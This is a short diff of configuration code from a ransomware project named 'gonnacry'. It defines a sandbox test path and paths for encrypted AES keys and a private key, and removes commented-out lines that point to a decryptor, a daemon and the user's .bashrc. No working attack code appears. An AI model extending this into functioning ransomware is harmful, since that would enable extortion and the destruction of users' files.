@@ -18,16 +18,7 @@ ransomware_name = "gonnacry"
 test_path = "/home/ubuntusandbox/test/"
 
 home = environment.get_home_path()
-# desktop = environment.get_desktop_path()
-# username = environment.get_username()
 ransomware_path = os.path.join(home, ransomware_name)
-# decryptor_path = os.path.join(ransomware_path, "decryptor")
-# # daemon_path = os.path.join(ransomware_path, "daemon")
-# img_path = os.path.join(ransomware_path, "img.png")
-# gonnacry_path = ''
-# bashrc_path = os.path.join(home, '.bashrc')
-# daemon_desktop = os.path.join(ransomware_path, 'daemon.desktop')
-# daemon_service = os.path.join(ransomware_path, 'daemon.service')
 
 aes_encrypted_keys_path = os.path.join(ransomware_path, "AES_encrypted_keys.txt")
 encrypted_client_private_key_path = os.path.join(ransomware_path, 'encrypted_client_private_key.key')
